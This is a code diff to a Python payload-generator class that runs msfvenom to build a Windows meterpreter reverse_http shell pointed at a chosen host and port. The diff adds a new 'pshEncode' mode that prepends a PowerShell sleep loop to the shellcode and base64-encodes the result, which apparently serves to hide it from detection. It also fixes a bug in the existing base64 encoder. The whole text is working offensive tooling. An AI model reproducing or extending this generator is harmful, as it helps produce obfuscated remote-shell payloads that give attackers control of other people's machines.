@@ -18,6 +18,8 @@ class Generator():
 			form = "vba"
 		elif shellProcess == 'b64Encode':
 			form = "raw"
+		elif shellProcess == 'pshEncode':
+			form = "psh"
 		
 		if (arch  == "x86"):
 			os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
@@ -34,7 +36,9 @@ class Generator():
 		elif shellProcess == 'decEncode':
 			shellcode = self.decEncode(shellcode)
 		elif shellProcess == 'b64Encode':
-			shellcode = self.b64Encode(code)
+			shellcode = self.b64Encode(shellcode)
+		elif shellProcess == 'pshEncode':
+			shellcode = self.pshEncode(shellcode)
 
 		return shellcode
 
@@ -77,4 +81,9 @@ class Generator():
 			
 		return(shellcode)
 
-		
+	def pshEncode(self, shellcode):
+		shellcode = "for (;;){\n  Start-sleep 60\n}" + shellcode
+		shellcode = base64.b64encode(shellcode.encode('utf-8'))
+		shellcode = shellcode.decode('utf-8')
+
+		return shellcode
